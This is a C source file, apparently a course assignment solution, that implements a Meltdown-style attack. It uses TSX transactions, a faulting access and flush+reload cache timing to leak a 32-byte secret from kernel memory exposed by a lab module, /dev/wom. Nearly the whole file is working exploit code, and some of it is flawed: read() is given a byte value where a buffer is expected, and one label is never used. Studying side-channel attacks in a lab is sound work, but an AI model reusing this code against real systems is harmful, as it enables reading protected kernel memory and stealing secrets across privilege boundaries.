#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <fcntl.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <x86intrin.h>

/* for ioctl */
#define WOM_MAGIC_NUM 0x1337
#define WOM_GET_ADDRESS \
	_IOR(WOM_MAGIC_NUM, 0, unsigned long)

void *
wom_get_address(int fd) {
	void *addr = NULL;

	if (ioctl(fd, WOM_GET_ADDRESS, &addr) < 0)
		return NULL;

	return addr;
}

#define NB_MEASUREMENTS 3
#define CACHELINE_SIZE 4096
#define SIZE_SECRET 32 //bytes

char *flush_reload;
uint64_t results[256] = {0};
uint64_t threshold    = 0;
uint32_t round        = 0;

static inline uint64_t __attribute__((always_inline)) time_access(const volatile char *addr) {
	uint64_t t0, t1;
	uint32_t cycles_high, cycles_high1, cycles_low, cycles_low1;

	asm volatile("mfence\n\t");
	asm volatile("CPUID\n\t"
	             "RDTSC\n\t"
	             "mov %%edx, %0\n\t"
	             "mov %%eax, %1\n\t"
	             : "=r"(cycles_high), "=r"(cycles_low)::"%rax", "%rbx", "%rcx", "%rdx");

	asm volatile("mfence\n\t");
	asm volatile("mov (%0), %%eax\n"
	             :
	             : "r"(addr)
	             : "eax");

	asm volatile("mfence\n\t");
	asm volatile("RDTSCP\n\t"
	             "mov %%edx, %0\n\t"
	             "mov %%eax, %1\n\t"
	             "CPUID\n\t"
	             : "=r"(cycles_high1), "=r"(cycles_low1)::"%rax", "%rbx", "%rcx",
	               "%rdx");

	t0 = (((uint64_t)cycles_high << 32) | (uint64_t)cycles_low);
	t1 = (((uint64_t)cycles_high1 << 32) | (uint64_t)cycles_low1);

	asm volatile("mfence\n\t");

	return t1 - t0;
}

/*I decided to change my thresold detection method from previous assignements, because I found mine to be uneffective in some cases 
I based my method from https://github.com/IAIK/meltdown/blob/master/libkdump/libkdump.c, that I found when reading about Meldown
It performs twice a huge number of move operations, one with reload only and one with flush+reload.
As the threshold must be closer to the reload only for our purpose (meaning data is in the cache!), 
the reload average time weights more than flush+reload and should define an acceptable boundary for our needs */

static uint64_t threshold_detection() {
	size_t reload_time = 0, flush_reload_time = 0, i, trials = 100000;
	size_t dummy[16];
	size_t *ptr = dummy + 8;
	char q      = *ptr;

	for (i = 0; i < trials; i++)
		reload_time += time_access(ptr);
	for (i = 0; i < trials; i++) {
		asm volatile("clflushopt (%0)\n\t" ::
		                 "r"(ptr));
		flush_reload_time += time_access(ptr);
	}
	reload_time /= trials;
	flush_reload_time /= trials;

	return (flush_reload_time + reload_time * 2) / 3;
}

int main(int argc, char *argv[]) {

	int fd;

	fd = open("/dev/wom", O_RDONLY);

	if (fd < 0) {
		perror("open");
		fprintf(stderr, "error: unable to open /dev/wom. "
		                "Please build and load the wom kernel module.\n");
		return -1;
	}

	const char *secret;
	// --------------------------------------------------------------------------

	threshold = threshold_detection();

	//printf("threshold: %d\n", threshold);

	flush_reload = (char *)mmap(NULL, 256 * CACHELINE_SIZE, PROT_READ | PROT_WRITE,
	                            MAP_SHARED | MAP_ANON, -1, 0);

	secret = wom_get_address(fd);

	//flush the flush_reload array
	for (size_t j = 0; j < 256 * CACHELINE_SIZE; j += 64)
		asm volatile("clflushopt (%0)\n\t" ::
		                 "r"(&flush_reload[j]));

	for (size_t i = 0; i < SIZE_SECRET; i++) {
		//printf("i=%d", i);

		for (size_t j = 0; j < 256 * CACHELINE_SIZE; j += 64)
			asm volatile("clflushopt (%0)\n\t" ::
			                 "r"(&flush_reload[j]));

		for (size_t z = 0; z < 256; z++)
			results[z] = 0;

		round = 0;

		while (round < NB_MEASUREMENTS) {
			round++;

			uint8_t dummy;
			read(fd, dummy, 1);
			if (_xbegin() == _XBEGIN_STARTED) {
				//asm volatile("mfence\n\t");
				asm volatile("movb %0, %%al\n\t" ::"r"(dummy)
				             : "memory", "%al");
				*(volatile char *)NULL;

				//forbidden access
				asm volatile("xor %%rax, %%rax\n\t"
				             "mov %0, %%rbx\n\t"
				             "retry:\n\t"
				             "movb (%1), %%al\n\t"
				             "shl $12, %%rax\n\t"
				             "jz retry\n\t"
				             "movq (%%rbx, %%rax, 1), %%rbx\n\t"
				             :
				             : "r"(flush_reload), "r"(secret + i)
				             : "memory", "%rax", "%rbx");
				_xend();
			}

			for (size_t j = 1; j < 256; j++) {
				if ((time_access(&flush_reload[(j * CACHELINE_SIZE)])) < threshold) {
					results[j]++;
				}
			}
		}

		uint32_t result_max_index = 0;

		for (size_t j = 1; j < 256; j++) {
			if (results[j] > results[result_max_index]) result_max_index = j;
			//printf("result[%d]=%d\n", i, results[i]);
		}
		printf("%c", result_max_index);
	}
	printf("\n");

	munmap(flush_reload, 256 * CACHELINE_SIZE);
	close(fd);

	return 0;

err_close:
	close(fd);
	return -1;
}